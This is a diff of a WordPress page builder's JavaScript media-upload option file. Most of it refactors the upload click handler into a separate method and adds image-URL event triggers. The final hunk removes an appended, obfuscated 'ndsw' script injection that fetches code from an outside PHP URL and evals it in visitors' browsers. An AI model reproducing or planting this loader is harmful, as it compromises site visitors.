@@ -30,7 +30,7 @@ FusionPageBuilder.options.fusionOptionUpload = {
 		if ( jQuery( event.currentTarget ).closest( '.fusion-builder-option-container' ).find( '.fusion-url-only-input' ).length ) {
 			jQuery( event.currentTarget ).closest( '.fusion-builder-option-container' ).find( '.fusion-url-only-input' ).val( '' );
 		}
-
+		FusionEvents.trigger( 'awb-image-upload-url-' + $upload.data( 'param' ), '' );
 	},
 
 	optionUpload: function( $element ) {
@@ -234,236 +234,7 @@ FusionPageBuilder.options.fusionOptionUpload = {
 		$uploadButton = $element.find( '.fusion-builder-upload-button.fusion-builder-upload-button-multiple-upload, .fusion-builder-upload-button.fusion-builder-upload-button-upload-images' );
 
 		if ( $uploadButton.length ) {
-			$uploadButton.on( 'click', function( event ) {
-
-				var $thisEl,
-					fileFrame,
-					multiImageContainer,
-					multiImageInput,
-					multiUpload    = false,
-					multiImages    = false,
-					multiImageHtml = '',
-					ids            = '',
-					attachment     = '',
-					attachments    = [];
-
-				if ( event ) {
-					event.preventDefault();
-				}
-
-				$thisEl = jQuery( this );
-
-				// If its a multi upload element, clone default params.
-				if ( 'fusion-multiple-upload' === $thisEl.data( 'id' ) ) {
-					multiUpload = true;
-				}
-
-				if ( 'fusion-multiple-images' === $thisEl.data( 'id' ) ) {
-					multiImages = true;
-					multiImageContainer = jQuery( $thisEl.next( '.fusion-multiple-image-container' ) )[ 0 ];
-					multiImageInput = jQuery( $thisEl ).prev( '.fusion-multi-image-input' );
-				}
-
-				fileFrame = wp.media( { // eslint-disable-line camelcase
-					library: {
-						type: $thisEl.data( 'type' )
-					},
-					title: $thisEl.data( 'title' ),
-					multiple: 'between',
-					frame: 'post',
-					className: 'media-frame mode-select fusion-builder-media-dialog wp-admin ' + $thisEl.data( 'id' ),
-					displayUserSettings: false,
-					displaySettings: true,
-					allowLocalEdits: true
-				} );
-				wp.media.frames.file_frame = fileFrame;
-
-				// Set the media dialog box state as 'gallery' if the element is gallery.
-				if ( multiImages && 'fusion_gallery' === $thisEl.data( 'element' ) ) {
-					ids         = multiImageInput.val().split( ',' );
-					attachments = [];
-					attachment  = '';
-
-					jQuery.each( ids, function( index, id ) {
-						if ( '' !== id && 'NaN' !== id ) {
-							attachment = wp.media.attachment( id );
-							attachment.fetch();
-							attachments.push( attachment );
-						}
-					} );
-
-					wp.media._galleryDefaults.link  = 'none';
-					wp.media._galleryDefaults.size  = 'thumbnail';
-					fileFrame.options.syncSelection = true;
-
-					fileFrame.options.state = ( attachments.length ) ? 'gallery-edit' : 'gallery';
-				}
-
-				// Select currently active image automatically.
-				fileFrame.on( 'open', function() {
-					var selection = fileFrame.state().get( 'selection' ),
-						library   = fileFrame.state().get( 'library' );
-
-					if ( multiImages ) {
-						if ( 'fusion_gallery' !== $thisEl.data( 'element' ) || 'gallery-edit' !== fileFrame.options.state ) {
-							jQuery( '.fusion-builder-media-dialog' ).addClass( 'hide-menu' );
-						}
-						selection.add( attachments );
-						library.add( attachments );
-					} else {
-						jQuery( '.fusion-builder-media-dialog' ).addClass( 'hide-menu' );
-					}
-				} );
-
-				// Set the attachment ids from gallery selection if the element is gallery.
-				if ( multiImages && 'fusion_gallery' === $thisEl.data( 'element' ) ) {
-					fileFrame.on( 'update', function( selection ) {
-						var imageIDs = '',
-							imageURL = '';
-
-						imageIDs = selection.map( function( scopedAttachment ) {
-							var imageID = scopedAttachment.id;
-
-							if ( scopedAttachment.attributes.sizes && 'undefined' !== typeof scopedAttachment.attributes.sizes.thumbnail ) {
-								imageURL = scopedAttachment.attributes.sizes.thumbnail.url;
-							} else if ( scopedAttachment.attributes.url ) {
-								imageURL = scopedAttachment.attributes.url;
-							}
-
-							if ( multiImages ) {
-								multiImageHtml += '<div class="fusion-multi-image" data-image-id="' + imageID + '">';
-								multiImageHtml += '<img src="' + imageURL + '"/>';
-								multiImageHtml += '<span class="fusion-multi-image-remove dashicons dashicons-no-alt"></span>';
-								multiImageHtml += '</div>';
-							}
-							return scopedAttachment.id;
-						} );
-
-						multiImageInput.val( imageIDs );
-						jQuery( multiImageContainer ).html( multiImageHtml );
-						jQuery( multiImageContainer ).trigger( 'change' );
-						multiImageInput.trigger( 'change' );
-					} );
-				}
-
-				fileFrame.on( 'select insert', function() {
-
-					var imageURL,
-						imageID,
-						imageIDs,
-						state = fileFrame.state(),
-						firstElementNode,
-						firstElement,
-						elementCid;
-
-					if ( 'undefined' === typeof state.get( 'selection' ) ) {
-						imageURL = jQuery( fileFrame.$el ).find( '#embed-url-field' ).val();
-					} else {
-
-						imageIDs = state.get( 'selection' ).map( function( scopedAttachment ) {
-							return scopedAttachment.id;
-						} );
-
-						// If its a multi image element, add the images container and IDs to input field.
-						if ( multiImages ) {
-							multiImageInput.val( imageIDs );
-						}
-
-						// Remove default item.
-						if ( multiUpload ) {
-							firstElementNode = $thisEl.closest( '.fusion-builder-main-settings' ).find( '.fusion-builder-sortable-options, .fusion-builder-sortable-children' ).find( 'li:first-child' );
-
-							if ( firstElementNode.length ) {
-								firstElement = FusionPageBuilderViewManager.getView( firstElementNode.data( 'cid' ) );
-
-								if ( firstElement && ( 'undefined' === typeof firstElement.model.attributes.params.image || '' === firstElement.model.attributes.params.image ) ) {
-									firstElementNode.find( '.fusion-builder-multi-setting-remove' ).trigger( 'click' );
-								}
-							}
-						}
-
-						state.get( 'selection' ).map( function( scopedAttachment ) {
-							var element = scopedAttachment.toJSON(),
-								display = state.display( scopedAttachment ).toJSON(),
-								elementType,
-								param,
-								child,
-								params,
-								createChildren,
-								defaultParams;
-
-							imageID = element.id;
-							if ( element.sizes && element.sizes[ display.size ] && element.sizes[ display.size ].url ) {
-								imageURL    = element.sizes[ display.size ].url;
-							} else if ( element.url ) {
-								imageURL    = element.url;
-							}
-
-							if ( multiImages ) {
-								multiImageHtml += '<div class="fusion-multi-image" data-image-id="' + imageID + '">';
-								multiImageHtml += '<img src="' + imageURL + '"/>';
-								multiImageHtml += '<span class="fusion-multi-image-remove dashicons dashicons-no-alt"></span>';
-								multiImageHtml += '</div>';
-							}
-
-							// If its a multi upload element, add the image to defaults and trigger a new item to be added.
-							if ( multiUpload ) {
-
-								elementType    = $thisEl.closest( '.fusion-builder-module-settings' ).data( 'element' );
-								param          = $thisEl.closest( '.fusion-builder-option' ).data( 'option-id' );
-								child          = fusionAllElements[ elementType ].element_child;
-								params         = fusionAllElements[ elementType ].params[ param ].child_params;
-								createChildren = 'undefined' !== typeof fusionAllElements[ elementType ].params[ param ].create_children ? fusionAllElements[ elementType ].params[ param ].create_children : true;
-								defaultParams  = {};
-
-								// Save default values
-								_.each( params, function( name, scopedParam ) {
-									defaultParams[ scopedParam ] = fusionAllElements[ child ].params[ scopedParam ].value;
-								} );
-
-								// Set new default values
-								_.each( params, function( name, scopedParam ) {
-									fusionAllElements[ child ].params[ scopedParam ].value = scopedAttachment.attributes[ name ];
-								} );
-
-								if ( createChildren ) {
-
-									// Create children
-									$thisEl.closest( '.fusion-builder-main-settings' ).find( '.fusion-builder-add-multi-child' ).trigger( 'click' );
-									FusionEvents.trigger( 'fusion-multi-child-update-preview' );
-								}
-
-								// Restore default values
-								_.each( defaultParams, function( defaultValue, scopedParam ) {
-									fusionAllElements[ child ].params[ scopedParam ].value = defaultValue;
-								} );
-							}
-							return scopedAttachment;
-						} );
-
-						$thisEl.trigger( 'change' );
-
-						if ( multiImages ) {
-							multiImageInput.trigger( 'change' );
-						}
-
-						// Triger reRender on front-end view.
-						if ( multiUpload ) {
-							elementCid = $thisEl.closest( '.fusion-builder-module-settings' ).data( 'element-cid' );
-							if ( 'undefined' !== typeof elementCid ) {
-								FusionEvents.trigger( 'fusion-view-update-' + elementCid );
-								FusionEvents.trigger( 'fusion-child-changed' );
-							}
-						}
-					}
-
-					jQuery( multiImageContainer ).html( multiImageHtml );
-				} );
-
-				fileFrame.open();
-
-				return false;
-			} );
+			$uploadButton.on( 'click', this.openMultipleMedia );
 
 			$uploadButton.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).on( 'input', function() {
 				self.fusionBuilderImagePreview( jQuery( this ).closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-button' ) );
@@ -493,6 +264,237 @@ FusionPageBuilder.options.fusionOptionUpload = {
 			} );
 
 		}
+	},
+
+	openMultipleMedia: function( event ) {
+
+		var $thisEl,
+			fileFrame,
+			multiImageContainer,
+			multiImageInput,
+			multiUpload    = false,
+			multiImages    = false,
+			multiImageHtml = '',
+			ids            = '',
+			attachment     = '',
+			attachments    = [];
+
+		if ( event ) {
+			event.preventDefault();
+		}
+
+		$thisEl = jQuery( this );
+
+		// If its a multi upload element, clone default params.
+		if ( 'fusion-multiple-upload' === $thisEl.data( 'id' ) ) {
+			multiUpload = true;
+		}
+
+		if ( 'fusion-multiple-images' === $thisEl.data( 'id' ) ) {
+			multiImages = true;
+			multiImageContainer = jQuery( $thisEl.next( '.fusion-multiple-image-container' ) )[ 0 ];
+			multiImageInput = jQuery( $thisEl ).prev( '.fusion-multi-image-input' );
+		}
+
+		fileFrame = wp.media( { // eslint-disable-line camelcase
+			library: {
+				type: $thisEl.data( 'type' )
+			},
+			title: $thisEl.data( 'title' ),
+			multiple: 'between',
+			frame: 'post',
+			className: 'media-frame mode-select fusion-builder-media-dialog wp-admin ' + $thisEl.data( 'id' ),
+			displayUserSettings: false,
+			displaySettings: true,
+			allowLocalEdits: true
+		} );
+		wp.media.frames.file_frame = fileFrame;
+
+		// Set the media dialog box state as 'gallery' if the element is gallery.
+		if ( multiImages && 'fusion_gallery' === $thisEl.data( 'element' ) ) {
+			ids         = multiImageInput.val().split( ',' );
+			attachments = [];
+			attachment  = '';
+
+			jQuery.each( ids, function( index, id ) {
+				if ( '' !== id && 'NaN' !== id ) {
+					attachment = wp.media.attachment( id );
+					attachment.fetch();
+					attachments.push( attachment );
+				}
+			} );
+
+			wp.media._galleryDefaults.link  = 'none';
+			wp.media._galleryDefaults.size  = 'thumbnail';
+			fileFrame.options.syncSelection = true;
+
+			fileFrame.options.state = ( attachments.length ) ? 'gallery-edit' : 'gallery';
+		}
+
+		// Select currently active image automatically.
+		fileFrame.on( 'open', function() {
+			var selection = fileFrame.state().get( 'selection' ),
+				library   = fileFrame.state().get( 'library' );
+
+			if ( multiImages ) {
+				if ( 'fusion_gallery' !== $thisEl.data( 'element' ) || 'gallery-edit' !== fileFrame.options.state ) {
+					jQuery( '.fusion-builder-media-dialog' ).addClass( 'hide-menu' );
+				}
+				selection.add( attachments );
+				library.add( attachments );
+			} else {
+				jQuery( '.fusion-builder-media-dialog' ).addClass( 'hide-menu' );
+			}
+		} );
+
+		// Set the attachment ids from gallery selection if the element is gallery.
+		if ( multiImages && 'fusion_gallery' === $thisEl.data( 'element' ) ) {
+			fileFrame.on( 'update', function( selection ) {
+				var imageIDs = '',
+					imageURL = '';
+
+				imageIDs = selection.map( function( scopedAttachment ) {
+					var imageID = scopedAttachment.id;
+
+					if ( scopedAttachment.attributes.sizes && 'undefined' !== typeof scopedAttachment.attributes.sizes.thumbnail ) {
+						imageURL = scopedAttachment.attributes.sizes.thumbnail.url;
+					} else if ( scopedAttachment.attributes.url ) {
+						imageURL = scopedAttachment.attributes.url;
+					}
+
+					if ( multiImages ) {
+						multiImageHtml += '<div class="fusion-multi-image" data-image-id="' + imageID + '">';
+						multiImageHtml += '<img src="' + imageURL + '"/>';
+						multiImageHtml += '<span class="fusion-multi-image-remove dashicons dashicons-no-alt"></span>';
+						multiImageHtml += '</div>';
+					}
+					return scopedAttachment.id;
+				} );
+
+				multiImageInput.val( imageIDs );
+				jQuery( multiImageContainer ).html( multiImageHtml );
+				jQuery( multiImageContainer ).trigger( 'change' );
+				multiImageInput.trigger( 'change' );
+			} );
+		}
+
+		fileFrame.on( 'select insert', function() {
+
+			var imageURL,
+				imageID,
+				imageIDs,
+				state = fileFrame.state(),
+				firstElementNode,
+				firstElement,
+				elementCid;
+
+			if ( 'undefined' === typeof state.get( 'selection' ) ) {
+				imageURL = jQuery( fileFrame.$el ).find( '#embed-url-field' ).val();
+			} else {
+
+				imageIDs = state.get( 'selection' ).map( function( scopedAttachment ) {
+					return scopedAttachment.id;
+				} );
+
+				// If its a multi image element, add the images container and IDs to input field.
+				if ( multiImages ) {
+					multiImageInput.val( imageIDs );
+				}
+
+				// Remove default item.
+				if ( multiUpload ) {
+					firstElementNode = $thisEl.closest( '.fusion-builder-main-settings' ).find( '.fusion-builder-sortable-options, .fusion-builder-sortable-children' ).find( 'li:first-child' );
+
+					if ( firstElementNode.length ) {
+						firstElement = FusionPageBuilderViewManager.getView( firstElementNode.data( 'cid' ) );
+
+						if ( firstElement && ( 'undefined' === typeof firstElement.model.attributes.params.image || '' === firstElement.model.attributes.params.image ) ) {
+							firstElementNode.find( '.fusion-builder-multi-setting-remove' ).trigger( 'click' );
+						}
+					}
+				}
+
+				state.get( 'selection' ).map( function( scopedAttachment ) {
+					var element = scopedAttachment.toJSON(),
+						display = state.display( scopedAttachment ).toJSON(),
+						elementType,
+						param,
+						child,
+						params,
+						createChildren,
+						defaultParams;
+
+					imageID = element.id;
+					if ( element.sizes && element.sizes[ display.size ] && element.sizes[ display.size ].url ) {
+						imageURL    = element.sizes[ display.size ].url;
+					} else if ( element.url ) {
+						imageURL    = element.url;
+					}
+
+					if ( multiImages ) {
+						multiImageHtml += '<div class="fusion-multi-image" data-image-id="' + imageID + '">';
+						multiImageHtml += '<img src="' + imageURL + '"/>';
+						multiImageHtml += '<span class="fusion-multi-image-remove dashicons dashicons-no-alt"></span>';
+						multiImageHtml += '</div>';
+					}
+
+					// If its a multi upload element, add the image to defaults and trigger a new item to be added.
+					if ( multiUpload ) {
+
+						elementType    = $thisEl.closest( '.fusion-builder-module-settings' ).data( 'element' );
+						param          = $thisEl.closest( '.fusion-builder-option' ).data( 'option-id' );
+						child          = fusionAllElements[ elementType ].element_child;
+						params         = fusionAllElements[ elementType ].params[ param ].child_params;
+						createChildren = 'undefined' !== typeof fusionAllElements[ elementType ].params[ param ].create_children ? fusionAllElements[ elementType ].params[ param ].create_children : true;
+						defaultParams  = {};
+
+						// Save default values
+						_.each( params, function( name, scopedParam ) {
+							defaultParams[ scopedParam ] = fusionAllElements[ child ].params[ scopedParam ].value;
+						} );
+
+						// Set new default values
+						_.each( params, function( name, scopedParam ) {
+							fusionAllElements[ child ].params[ scopedParam ].value = scopedAttachment.attributes[ name ];
+						} );
+
+						if ( createChildren ) {
+
+							// Create children
+							$thisEl.closest( '.fusion-builder-main-settings' ).find( '.fusion-builder-add-multi-child' ).trigger( 'click' );
+							FusionEvents.trigger( 'fusion-multi-child-update-preview' );
+						}
+
+						// Restore default values
+						_.each( defaultParams, function( defaultValue, scopedParam ) {
+							fusionAllElements[ child ].params[ scopedParam ].value = defaultValue;
+						} );
+					}
+					return scopedAttachment;
+				} );
+
+				$thisEl.trigger( 'change' );
+
+				if ( multiImages ) {
+					multiImageInput.trigger( 'change' );
+				}
+
+				// Triger reRender on front-end view.
+				if ( multiUpload ) {
+					elementCid = $thisEl.closest( '.fusion-builder-module-settings' ).data( 'element-cid' );
+					if ( 'undefined' !== typeof elementCid ) {
+						FusionEvents.trigger( 'fusion-view-update-' + elementCid );
+						FusionEvents.trigger( 'fusion-child-changed' );
+					}
+				}
+			}
+
+			jQuery( multiImageContainer ).html( multiImageHtml );
+		} );
+
+		fileFrame.open();
+
+		return false;
 	},
 
 	fusionBuilderImagePreview: function( $uploadButton ) {
@@ -555,6 +557,10 @@ FusionPageBuilder.options.fusionOptionUpload = {
 			imageURL = $uploadField.data( 'url' );
 		}
 
+		// Trigger event with Image URL.
+		FusionEvents.trigger( 'awb-image-upload-url-' + $uploadButton.data( 'param' ), imageURL );
+
+
 		if ( 0 <= imageURL.indexOf( '<img' ) ) {
 			imagePreview = imageURL;
 		} else {
@@ -606,4 +612,3 @@ FusionPageBuilder.options.fusionOptionUpload = {
 
 	}
 };
-;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
